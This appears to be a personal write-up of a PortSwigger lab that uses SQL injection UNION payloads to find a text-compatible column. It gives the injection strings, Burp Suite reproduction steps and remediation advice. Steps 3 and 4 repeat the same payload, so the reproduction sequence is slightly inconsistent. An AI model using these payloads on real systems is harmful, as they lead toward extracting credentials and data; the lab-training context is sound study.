# SQL Injection UNION Attack - Finding a Column Containing Text

**Target:** PortSwigger Web Security Academy (SQL injection lab)
**Vulnerability Class:** SQL Injection (CWE-89)

## Summary
After confirming the query returns 3 columns, I tested each column to find
which one could hold string data by replacing each `NULL` with a marker
string one at a time. One column reflected the string, confirming it accepts
text data.

## Affected Endpoint
    GET /filter?category=<input>

## Root Cause
The application concatenates user input directly into the SQL query without
sanitization:

    SELECT * FROM products WHERE category = '<input>'


## Payload

    'UNION SELECT 'a',NULL,NULL--
    'UNION SELECT NULL,'a',NULL--
    'UNION SELECT NULL,NULL,'a'--


## Payload Breakdown
- The number of columns (3) was already confirmed in the previous lab.
- Each payload tests one column at a time by putting a string literal in
  that position and `NULL` in the rest.
- A column that rejects a string causes a database error; a column that
  accepts it reflects the value in the page.

## Steps to Reproduce
1. Use Burp Suite to intercept the request that sets the product category filter.
2. Modify the `category` parameter to `'UNION SELECT 'a',NULL,NULL--`. Observe the result.
3. Modify the `category` parameter to `'UNION SELECT NULL,'a',NULL--`. Observe the result.
4. Modify the category parameter to `'UNION SELECT NULL,'a',NULL--`. The string a appears in the page.
5. This confirms that column 2 contains text data.

## Impact
Identifying a text-compatible column is a prerequisite for extracting data
(usernames, passwords, etc.) via a full UNION-based SQL injection attack.

## Remediation
- Use parameterized queries (prepared statements). Do not add user input directly into SQL queries.
- Apply the principle of least privilege to the database account used by the application.
- Show a generic error message instead of a detailed database error.

## Evidence
<img width="1920" height="1200" alt="Pasted image 20260915055511" src="https://github.com/user-attachments/assets/def10602-9579-4287-9ce8-f3468afaa19b" />
<img width="1920" height="1200" alt="Pasted image 20260915055528" src="https://github.com/user-attachments/assets/f22552ab-82ac-4307-aad4-576e7ebb9727" />
